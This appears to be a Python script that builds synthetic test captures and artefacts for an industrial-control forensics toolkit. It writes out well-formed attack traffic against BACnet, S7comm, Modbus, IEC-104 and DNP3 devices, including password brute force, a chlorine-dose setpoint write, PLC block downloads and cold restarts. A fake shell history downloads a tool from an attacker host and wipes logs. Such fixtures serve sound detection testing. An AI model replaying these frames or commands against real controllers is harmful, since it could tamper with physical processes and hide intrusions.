#!/usr/bin/env python3
"""Generate synthetic captures and binary artefacts to exercise every tool.

These fixtures contain no challenge data of any kind - they are hand-built
packets whose fields are known, so the decoders can be checked against the
truth. Run:  python3 tests/make_fixtures.py out_dir/
"""
from __future__ import annotations

import os
import struct
import sys
import zlib

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ---------------------------------------------------------------- pcap writer
class PcapWriter:
    def __init__(self, path: str, linktype: int = 1):
        self.fh = open(path, "wb")
        self.fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 262144, linktype))
        self.t = 1700000000.0

    def close(self) -> None:
        self.fh.close()

    def _write(self, frame: bytes, dt: float = 0.01) -> None:
        self.t += dt
        sec = int(self.t)
        usec = int(round((self.t - sec) * 1e6))
        self.fh.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
        self.fh.write(frame)

    @staticmethod
    def _ip(src: str, dst: str, proto: int, payload: bytes) -> bytes:
        total = 20 + len(payload)
        hdr = struct.pack(">BBHHHBBH4s4s", 0x45, 0, total, 0x1234, 0, 64, proto, 0,
                          bytes(int(x) for x in src.split(".")),
                          bytes(int(x) for x in dst.split(".")))
        return hdr + payload

    def udp(self, src: str, dst: str, sport: int, dport: int, data: bytes,
            dt: float = 0.01) -> None:
        udp = struct.pack(">HHHH", sport, dport, 8 + len(data), 0) + data
        frame = (b"\x02\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x02\x08\x00"
                 + self._ip(src, dst, 17, udp))
        self._write(frame, dt)

    def tcp(self, src: str, dst: str, sport: int, dport: int, data: bytes,
            seq: int = 1, flags: int = 0x18, dt: float = 0.01) -> None:
        tcp = struct.pack(">HHIIBBHHH", sport, dport, seq, 1, 0x50, flags,
                          8192, 0, 0) + data
        frame = (b"\x02\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x02\x08\x00"
                 + self._ip(src, dst, 6, tcp))
        self._write(frame, dt)


# ------------------------------------------------------------------- BACnet
def bvlc(apdu: bytes, func: int = 0x0A) -> bytes:
    npdu = b"\x01\x04" + apdu
    return struct.pack(">BBH", 0x81, func, 4 + len(npdu)) + npdu


def objid(otype: int, inst: int) -> bytes:
    return struct.pack(">I", (otype << 22) | inst)


def ctx(num: int, data: bytes) -> bytes:
    return bytes([(num << 4) | 0x08 | min(len(data), 5)]) + data


def make_bacnet(path: str) -> None:
    w = PcapWriter(path)
    attacker, bc = "10.20.30.77", "10.20.30.10"
    zones = ["10.20.30.11", "10.20.30.12", "10.20.30.13"]

    # legitimate workstation polling present-value
    for i, z in enumerate(zones):
        req = bytes([0x00, 0x05, 10 + i, 0x0C]) + ctx(0, objid(4, 1 + i)) + ctx(1, bytes([85]))
        w.udp("10.20.30.5", z, 47808, 47808, bvlc(req))
        ack = bytes([0x30, 10 + i, 0x0C]) + ctx(0, objid(4, 1 + i)) + ctx(1, bytes([85])) \
            + b"\x3e\x91\x00\x3f"
        w.udp(z, "10.20.30.5", 47808, 47808, bvlc(ack))

    # device discovery by the rogue host
    w.udp(attacker, "10.20.30.255", 47808, 47808, bvlc(b"\x10\x08", func=0x0B))
    for i, z in enumerate([bc] + zones):
        iam = b"\x10\x00" + b"\xc4" + objid(8, 900 + i) + b"\x22\x01\xe0\x91\x00\x21\x63"
        w.udp(z, attacker, 47808, 47808, bvlc(iam))

    # DCC password brute force against the building controller
    for n, pw in enumerate(["admin", "bacnet", "service", "letmein", "Rivermill24"]):
        body = ctx(1, bytes([0x01])) + bytes([0x2D, len(pw) + 1, 0x00]) + pw.encode()
        req = bytes([0x00, 0x05, 20 + n, 0x11]) + body
        w.udp(attacker, bc, 47808, 47808, bvlc(req))
        if pw == "Rivermill24":
            w.udp(bc, attacker, 47808, 47808, bvlc(bytes([0x20, 20 + n, 0x11])))
        else:
            err = bytes([0x50, 20 + n, 0x11, 0x91, 0x04, 0x91, 0x1A])
            w.udp(bc, attacker, 47808, 47808, bvlc(err))

    # then the same accepted password against each zone controller, in order
    for i, z in enumerate(zones):
        pw = "Rivermill24"
        body = ctx(1, bytes([0x01])) + bytes([0x2D, len(pw) + 1, 0x00]) + pw.encode()
        req = bytes([0x00, 0x05, 40 + i, 0x11]) + body
        w.udp(attacker, z, 47808, 47808, bvlc(req))
        w.udp(z, attacker, 47808, 47808, bvlc(bytes([0x20, 40 + i, 0x11])))
        # unlock a door, kill the lights, disable an occupancy sensor
        for obj, prop, val in ((objid(4, 10 + i), 85, b"\x91\x01"),
                               (objid(4, 20 + i), 85, b"\x91\x00"),
                               (objid(3, 30 + i), 81, b"\x91\x01")):
            wp = bytes([0x00, 0x05, 50 + i, 0x0F]) + ctx(0, obj) + ctx(1, bytes([prop])) \
                + b"\x3e" + val + b"\x3f" + ctx(4, bytes([8]))
            w.udp(attacker, z, 47808, 47808, bvlc(wp))
            w.udp(z, attacker, 47808, 47808, bvlc(bytes([0x20, 50 + i, 0x0F])))

    # cover tracks: reinitializeDevice warmstart on the building controller
    pw = "Rivermill24"
    body = ctx(0, bytes([0x01])) + bytes([0x1D, len(pw) + 1, 0x00]) + pw.encode()
    w.udp(attacker, bc, 47808, 47808, bvlc(bytes([0x00, 0x05, 70, 0x14]) + body))
    w.udp(bc, attacker, 47808, 47808, bvlc(bytes([0x20, 70, 0x14])))
    w.close()


# ------------------------------------------------------------------- S7comm
def tpkt(cotp_payload: bytes) -> bytes:
    cotp = b"\x02\xf0\x80" + cotp_payload
    return struct.pack(">BBH", 0x03, 0x00, 4 + len(cotp)) + cotp


def s7_job(pduref: int, param: bytes, data: bytes = b"") -> bytes:
    hdr = struct.pack(">BBHHHH", 0x32, 0x01, 0, pduref, len(param), len(data))
    return tpkt(hdr + param + data)


def s7_ack(pduref: int, param: bytes, data: bytes = b"", err: int = 0) -> bytes:
    hdr = struct.pack(">BBHHHHBB", 0x32, 0x03, 0, pduref, len(param), len(data),
                      (err >> 8) & 0xFF, err & 0xFF)
    return tpkt(hdr + param + data)


def s7_userdata(pduref: int, grp: int, sub: int, data: bytes) -> bytes:
    param = b"\x00\x01\x12\x04\x11" + bytes([(grp & 0x0F) | 0x40, sub, 0x00])
    hdr = struct.pack(">BBHHHH", 0x32, 0x07, 0, pduref, len(param), len(data))
    return tpkt(hdr + param + data)


def make_s7(path: str) -> None:
    w = PcapWriter(path)
    atk, plc1, plc2 = "192.168.70.66", "192.168.70.11", "192.168.70.12"
    # COTP connect
    cr = struct.pack(">BBH", 0x03, 0x00, 22) + \
        b"\x12\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x0a"
    w.tcp(atk, plc1, 50001, 102, cr)
    w.tcp(plc1, atk, 102, 50001, struct.pack(">BBH", 0x03, 0x00, 11) + b"\x06\xd0\x00\x01\x00\x01\x00")
    # setup communication
    w.tcp(atk, plc1, 50001, 102, s7_job(1, b"\xf0\x00\x00\x01\x00\x01\x01\xe0"))
    w.tcp(plc1, atk, 102, 50001, s7_ack(1, b"\xf0\x00\x00\x01\x00\x01\x00\xf0"))
    # SZL fingerprinting: 0x0011, 0x001c, 0x0424 (ascending in the report)
    for i, szl in enumerate((0x0011, 0x001C, 0x0424)):
        data = b"\xff\x09\x00\x04" + struct.pack(">HH", szl, 0x0000)
        w.tcp(atk, plc1, 50001, 102, s7_userdata(10 + i, 0x04, 0x01, data))
        w.tcp(plc1, atk, 102, 50001, s7_userdata(10 + i, 0x04, 0x01, data + b"\x00" * 8))
    # read then write a real value (CL2 dose 4.25 mg/L)
    item = b"\x12\x0a\x10\x07\x00\x01\x00\x01\x84" + (0x0010).to_bytes(3, "big")
    w.tcp(atk, plc1, 50001, 102, s7_job(20, b"\x04\x01" + item))
    val = struct.pack(">f", 1.5)
    w.tcp(plc1, atk, 102, 50001, s7_ack(20, b"\x04\x01", b"\xff\x07\x00\x20" + val))
    w.tcp(atk, plc1, 50001, 102,
          s7_job(21, b"\x05\x01" + item, b"\x00\x07\x00\x20" + struct.pack(">f", 4.25)))
    w.tcp(plc1, atk, 102, 50001, s7_ack(21, b"\x05\x01", b"\xff"))
    # block download of three blocks
    for blk in ("_0800001P", "_0A00005P", "_0E00012P"):
        param = b"\x1a\x00\x00\x00\x00\x00\x09" + blk.encode()
        w.tcp(atk, plc1, 50001, 102, s7_job(30, param))
        w.tcp(plc1, atk, 102, 50001, s7_ack(30, b"\x1a\x00"))
    # CPU STOP rejected by both PLCs
    for plc in (plc1, plc2):
        param = b"\x29\x00\x00\x00\x00\x09P_PROGRAM"
        w.tcp(atk, plc, 50001, 102, s7_job(40, param))
        w.tcp(plc, atk, 102, 50001, s7_ack(40, b"\x29\x00", b"", err=0x8104))
    w.close()


# ------------------------------------------------------------------- Modbus
def mbap(tid: int, unit: int, pdu: bytes) -> bytes:
    return struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit) + pdu


def make_modbus(path: str) -> None:
    w = PcapWriter(path)
    hmi, plc, atk = "172.16.5.20", "172.16.5.10", "172.16.5.99"
    tid = 1
    # normal polling of 10 holding registers
    for _ in range(3):
        w.tcp(hmi, plc, 50100, 502, mbap(tid, 1, struct.pack(">BHH", 3, 0, 10)))
        regs = [1200, 0, 48, 0, 1, 0, 300, 0, 75, 0]
        body = struct.pack(">BB", 3, 20) + b"".join(struct.pack(">H", r) for r in regs)
        w.tcp(plc, hmi, 502, 50100, mbap(tid, 1, body))
        tid += 1
    # scanner sweeping unit ids and function codes
    for unit in range(1, 8):
        w.tcp(atk, plc, 40000 + unit, 502, mbap(tid, unit, struct.pack(">BHH", 3, 0, 1)))
        if unit <= 2:
            w.tcp(plc, atk, 502, 40000 + unit,
                  mbap(tid, unit, struct.pack(">BBH", 3, 2, 999)))
        else:
            w.tcp(plc, atk, 502, 40000 + unit, mbap(tid, unit, b"\x83\x0b"))
        tid += 1
    # ASCII hidden in an input-register block
    msg = b"PUMPHOUSE-A OK  "
    regs = [struct.unpack(">H", msg[i:i + 2])[0] for i in range(0, len(msg), 2)]
    w.tcp(atk, plc, 40100, 502, mbap(tid, 1, struct.pack(">BHH", 4, 100, len(regs))))
    w.tcp(plc, atk, 502, 40100, mbap(tid, 1, struct.pack(">BB", 4, len(regs) * 2)
                                     + b"".join(struct.pack(">H", r) for r in regs)))
    tid += 1
    # force an alarm coil off and write a float setpoint pair
    w.tcp(atk, plc, 40200, 502, mbap(tid, 1, struct.pack(">BHH", 5, 17, 0x0000)))
    w.tcp(plc, atk, 502, 40200, mbap(tid, 1, struct.pack(">BHH", 5, 17, 0x0000)))
    tid += 1
    f = struct.unpack(">HH", struct.pack(">f", 62.5))
    w.tcp(atk, plc, 40201, 502,
          mbap(tid, 1, struct.pack(">BHHB", 16, 40, 2, 4) + struct.pack(">HH", *f)))
    w.tcp(plc, atk, 502, 40201, mbap(tid, 1, struct.pack(">BHH", 16, 40, 2)))
    w.close()


# ------------------------------------------------------------------ IEC-104
def apdu(payload: bytes) -> bytes:
    return struct.pack(">BB", 0x68, len(payload)) + payload


def i_frame(tx: int, rx: int, asdu: bytes) -> bytes:
    ctrl = struct.pack("<HH", (tx << 1) & 0xFFFE, (rx << 1) & 0xFFFE)
    return apdu(ctrl + asdu)


def asdu(type_id: int, cot: int, ca: int, objects: bytes, num: int = 1,
         sq: bool = False, negative: bool = False) -> bytes:
    vsq = (0x80 if sq else 0) | (num & 0x7F)
    c = cot | (0x40 if negative else 0)
    return struct.pack("<BBBBH", type_id, vsq, c, 0, ca) + objects


def io(ioa: int, payload: bytes) -> bytes:
    return ioa.to_bytes(3, "little") + payload


def make_iec104(path: str) -> None:
    w = PcapWriter(path)
    mtu, rtu = "10.40.1.50", "10.40.1.9"
    w.tcp(mtu, rtu, 51000, 2404, apdu(b"\x07\x00\x00\x00"))     # STARTDT act
    w.tcp(rtu, mtu, 2404, 51000, apdu(b"\x0b\x00\x00\x00"))     # STARTDT con
    # general interrogation
    w.tcp(mtu, rtu, 51000, 2404, i_frame(0, 0, asdu(100, 6, 1, io(0, b"\x14"))))
    w.tcp(rtu, mtu, 2404, 51000, i_frame(0, 1, asdu(100, 7, 1, io(0, b"\x14"))))
    # measured values
    vals = b"".join(io(100 + i, struct.pack("<f", v) + b"\x00")
                    for i, v in enumerate((3.2, 61.4, 0.84)))
    w.tcp(rtu, mtu, 2404, 51000, i_frame(1, 1, asdu(13, 20, 1, vals, num=3)))
    # correct select-then-execute on IOA 2001
    w.tcp(mtu, rtu, 51000, 2404, i_frame(1, 2, asdu(45, 6, 1, io(2001, b"\x81"))))
    w.tcp(rtu, mtu, 2404, 51000, i_frame(2, 2, asdu(45, 7, 1, io(2001, b"\x81"))))
    w.tcp(mtu, rtu, 51000, 2404, i_frame(2, 3, asdu(45, 6, 1, io(2001, b"\x01"))))
    w.tcp(rtu, mtu, 2404, 51000, i_frame(3, 3, asdu(45, 7, 1, io(2001, b"\x01"))))
    w.tcp(rtu, mtu, 2404, 51000, i_frame(4, 3, asdu(45, 10, 1, io(2001, b"\x01"))))
    # violation: execute with no select, then a refused setpoint
    w.tcp(mtu, rtu, 51000, 2404, i_frame(3, 5, asdu(45, 6, 1, io(2002, b"\x00"))))
    w.tcp(mtu, rtu, 51000, 2404,
          i_frame(4, 5, asdu(50, 6, 1, io(3001, struct.pack("<f", 95.0) + b"\x00"))))
    w.tcp(rtu, mtu, 2404, 51000,
          i_frame(5, 5, asdu(50, 7, 1, io(3001, struct.pack("<f", 95.0) + b"\x00"),
                             negative=True)))
    # a dangling select, and a STOPDT to blind the operator
    w.tcp(mtu, rtu, 51000, 2404, i_frame(5, 6, asdu(46, 6, 1, io(2003, b"\x82"))))
    w.tcp(mtu, rtu, 51000, 2404, apdu(b"\x13\x00\x00\x00"))
    w.close()


# --------------------------------------------------------------------- DNP3
def dnp3_crc(data: bytes) -> bytes:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return struct.pack("<H", (~crc) & 0xFFFF)


def dnp3_frame(src: int, dst: int, app: bytes) -> bytes:
    body = b"\xc0" + app                     # transport header FIR|FIN seq 0
    ln = 5 + len(body)
    head = b"\x05\x64" + bytes([ln, 0xC4]) + struct.pack("<HH", dst, src)
    out = head + dnp3_crc(head)
    for i in range(0, len(body), 16):
        chunk = body[i:i + 16]
        out += chunk + dnp3_crc(chunk)
    return out


def make_dnp3(path: str) -> None:
    w = PcapWriter(path)
    master, out = "10.60.2.5", "10.60.2.30"
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc0\x01\x3c\x01\x06"))
    w.tcp(out, master, 20000, 52000, dnp3_frame(10, 1, b"\xc0\x81\x80\x00\x01\x02\x00\x00\x07\x01"))
    crob = b"\x0c\x01\x17\x01\x05" + b"\x03\x01" + struct.pack("<II", 100, 0) + b"\x00"
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc1\x05" + crob))
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc2\x15"))   # disable unsol
    w.tcp(master, out, 52000, 20000, dnp3_frame(1, 10, b"\xc3\x0d"))   # cold restart
    w.close()


# ---------------------------------------------------------------------- TDS
def make_tds(path: str) -> None:
    w = PcapWriter(path)
    jump, sql = "10.2.0.100", "10.2.0.40"
    user, pw, host, db = "hmi_svc", "Pr0cessC0ntrol!", "JUMPBOX01", "HISTORIAN"

    def enc(s: str) -> bytes:
        return s.encode("utf-16-le")

    def obf(s: str) -> bytes:
        out = bytearray()
        for b in enc(s):
            b = ((b & 0x0F) << 4) | (b >> 4)
            out.append(b ^ 0xA5)
        return bytes(out)

    fixed = bytearray(94)
    parts = []
    off = 94
    for name, blob in (("host", enc(host)), ("user", enc(user)), ("pass", obf(pw)),
                       ("app", enc("HMI")), ("server", enc("SQLHIST")),
                       ("unused", b""), ("lib", enc("ODBC")), ("lang", b""),
                       ("db", enc(db))):
        parts.append((name, off, len(blob) // 2, blob))
        off += len(blob)
    pos = {"host": 36, "user": 40, "pass": 44, "app": 48, "server": 52,
           "unused": 56, "lib": 60, "lang": 64, "db": 68}
    for name, o, ln, _ in parts:
        struct.pack_into("<HH", fixed, pos[name], o, ln)
    body = bytes(fixed) + b"".join(p[3] for p in parts)
    struct.pack_into("<I", fixed, 0, len(body))
    body = bytes(fixed) + b"".join(p[3] for p in parts)
    pkt = struct.pack(">BBHHBB", 0x10, 0x01, 8 + len(body), 0, 1, 0) + body
    w.tcp(jump, sql, 51515, 1433, pkt)
    q = "SELECT tagname, value FROM dbo.ProcessTags WHERE area='PUMPHOUSE'"
    tds = struct.pack(">BBHHBB", 0x01, 0x01, 8 + len(q) * 2, 0, 1, 0) + q.encode("utf-16-le")
    w.tcp(jump, sql, 51515, 1433, tds)
    w.tcp(jump, sql, 51516, 21, b"USER operator\r\n")
    w.tcp(jump, sql, 51516, 21, b"PASS Spring2024!\r\n")
    w.udp(jump, sql, 51517, 161,
          b"\x30\x26\x02\x01\x00\x04\x08private1\xa0\x17\x02\x04\x00\x00\x00\x01"
          b"\x02\x01\x00\x02\x01\x00\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00")
    w.close()


# ------------------------------------------------------------ binary artefacts
def make_gb_rom(path: str) -> None:
    rom = bytearray(b"\xff" * (64 * 1024))
    rom[0x100:0x104] = b"\x00\xc3\x50\x01"
    rom[0x104:0x134] = bytes([
        0xCE, 0xED, 0x66, 0x66, 0xCC, 0x0D, 0x00, 0x0B, 0x03, 0x73, 0x00, 0x83,
        0x00, 0x0C, 0x00, 0x0D, 0x00, 0x08, 0x11, 0x1F, 0x88, 0x89, 0x00, 0x0E,
        0xDC, 0xCC, 0x6E, 0xE6, 0xDD, 0xDD, 0xD9, 0x99, 0xBB, 0xBB, 0x67, 0x63,
        0x6E, 0x0E, 0xEC, 0xCC, 0xDD, 0xDC, 0x99, 0x9F, 0xBB, 0xB9, 0x33, 0x3E])
    title = b"WATERWORKS\x00\x00\x00\x00\x00\x00"
    rom[0x134:0x144] = title[:16]
    rom[0x143] = 0x00
    rom[0x147] = 0x13          # MBC3+RAM+BATTERY
    rom[0x148] = 0x01          # 64 KiB
    rom[0x149] = 0x03
    rom[0x14A] = 0x01
    rom[0x14B] = 0x33
    rom[0x14C] = 0x00
    # bank 1: operator text
    text = (b"PUMP P-101\x00FCV-2\x00BREAK TANK\x00SHIFT COMPLETE\x00"
            b"PLANT TRIP - LEVEL LOW\x00SERVICE MODE\x00ENTER KEY SEQUENCE\x00"
            b"MAINT ARCHIVE\x00")
    rom[0x4000:0x4000 + len(text)] = text
    # bank 1 also carries the rig's engineering constants
    rom[0x5000:0x5010] = struct.pack("<ffff", 1.5, 4.25, 10.0, 0.5)
    # bank 2: a zlib archive blob
    blob = zlib.compress(b"ARCHIVE v1\nshift log entry\nTOKEN-PLACEHOLDER-0001\n" * 4)
    rom[0x8000:0x8000 + len(blob)] = blob
    # bank 3: pseudo-random high-entropy region
    rnd = bytearray()
    x = 0x1234
    for _ in range(0x1000):
        x = (x * 1103515245 + 12345) & 0xFFFFFFFF
        rnd.append((x >> 16) & 0xFF)
    rom[0xC000:0xC000 + len(rnd)] = rnd
    s = 0
    for b in rom[0x134:0x14D]:
        s = (s - b - 1) & 0xFF
    rom[0x14D] = s
    g = (sum(rom) - rom[0x14E] - rom[0x14F]) & 0xFFFF
    rom[0x14E:0x150] = g.to_bytes(2, "big")
    with open(path, "wb") as fh:
        fh.write(rom)


def make_dos_com(path: str) -> None:
    code = bytearray()
    code += b"\xb4\x09\xba\x40\x01\xcd\x21"      # DOS print string
    code += b"\xb4\x01\xcd\x21"                  # read char
    code += b"\xb4\x00\xcd\x14"                  # serial init (INT 14h)
    code += b"\xb8\x00\x00\xcd\x10"              # BIOS video
    code += b"\xb4\x4c\xcd\x21"                  # terminate
    code += b"\x90" * (0x40 - len(code))
    text = (b"RIVERMILL SETPOINT UTILITY v1.6$"
            b"ENTER NEW CHLORINE SETPOINT (MG/L): $"
            b"ALARM LIMIT EXCEEDED - PUMP P-101 TRIP$"
            b"MANUAL MODE ENGAGED$")
    code += text
    code += struct.pack("<ffff", 1.5, 4.25, 10.0, 0.5)
    with open(path, "wb") as fh:
        fh.write(bytes(code))



# ------------------------------------------------------------------- logs
def make_auth_log(path: str) -> None:
    """A Linux auth log covering the same window as the captures."""
    lines = [
        "Nov 14 22:12:48 jumpbox sshd[2211]: Failed password for invalid user admin from 10.2.0.77 port 51122 ssh2",
        "Nov 14 22:12:51 jumpbox sshd[2211]: Failed password for invalid user admin from 10.2.0.77 port 51126 ssh2",
        "Nov 14 22:12:55 jumpbox sshd[2213]: Invalid user operator from 10.2.0.77",
        "Nov 14 22:13:02 jumpbox sshd[2217]: Accepted password for svc_hmi from 10.2.0.77 port 51140 ssh2",
        "Nov 14 22:13:02 jumpbox systemd-logind[640]: New session 42 of user svc_hmi.",
        "Nov 14 22:13:05 jumpbox sudo:  svc_hmi : TTY=pts/0 ; PWD=/home/svc_hmi ; USER=root ; COMMAND=/usr/bin/apt-get install -y python3-pymodbus",
        "Nov 14 22:13:09 jumpbox useradd[2240]: new user: name=maint, UID=1004, GID=1004, home=/home/maint, shell=/bin/bash",
        "Nov 14 22:13:10 jumpbox usermod[2242]: add 'maint' to group 'sudo'",
        "Nov 14 22:13:18 jumpbox sshd[2250]: Accepted publickey for maint from 10.2.0.77 port 51190 ssh2",
        "Nov 14 22:13:45 jumpbox systemd[1]: Stopped Historian Collector Service.",
    ]
    with open(path, "w") as fh:
        fh.write("\n".join(lines) + "\n")


def make_bash_history(path: str) -> None:
    """A shell history recorded with HISTTIMEFORMAT, so every command is dated."""
    base = 1700000000
    entries = [
        (base - 10, "id"),
        (base - 6, "cat /etc/hosts"),
        (base - 2, "curl -s http://10.2.0.77:8000/mbtool.py -o /tmp/mbtool.py"),
        (base + 4, "nmap -Pn -p 502,102,47808,20000 10.20.30.0/24"),
        (base + 60, "python3 /tmp/mbtool.py --write-coil 17 0 172.16.5.10"),
        (base + 120, "echo '' > ~/.bash_history"),
        (base + 130, "rm -f /var/log/auth.log.1"),
    ]
    with open(path, "w") as fh:
        for ts, cmd in entries:
            fh.write(f"#{ts}\n{cmd}\n")


def make_rom_v2(src: str, dst: str) -> None:
    """A second build of the ROM, with one patched constant - for bin-diff."""
    with open(src, "rb") as fh:
        rom = bytearray(fh.read())
    rom[0x4000:0x4010] = b"PUMP P-101 MOD\x00\x00"[:16]
    rom[0x5000:0x5004] = struct.pack("<f", 9.75)
    s = 0
    for b in rom[0x134:0x14D]:
        s = (s - b - 1) & 0xFF
    rom[0x14D] = s
    g = (sum(rom) - rom[0x14E] - rom[0x14F]) & 0xFFFF
    rom[0x14E:0x150] = g.to_bytes(2, "big")
    with open(dst, "wb") as fh:
        fh.write(rom)


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else "fixtures"
    os.makedirs(out, exist_ok=True)
    make_bacnet(os.path.join(out, "bacnet_bms.pcap"))
    make_s7(os.path.join(out, "s7comm_wtp.pcap"))
    make_modbus(os.path.join(out, "modbus_plc.pcap"))
    make_iec104(os.path.join(out, "iec104_rtu.pcap"))
    make_dnp3(os.path.join(out, "dnp3_outstation.pcap"))
    make_tds(os.path.join(out, "cleartext_dmz.pcap"))
    make_gb_rom(os.path.join(out, "rig.gb"))
    make_dos_com(os.path.join(out, "SETPT16.COM"))
    make_auth_log(os.path.join(out, "jumpbox_auth.log"))
    make_bash_history(os.path.join(out, "jumpbox_bash_history"))
    make_rom_v2(os.path.join(out, "rig.gb"), os.path.join(out, "rig_v2.gb"))
    print("fixtures written to", out)


if __name__ == "__main__":
    main()
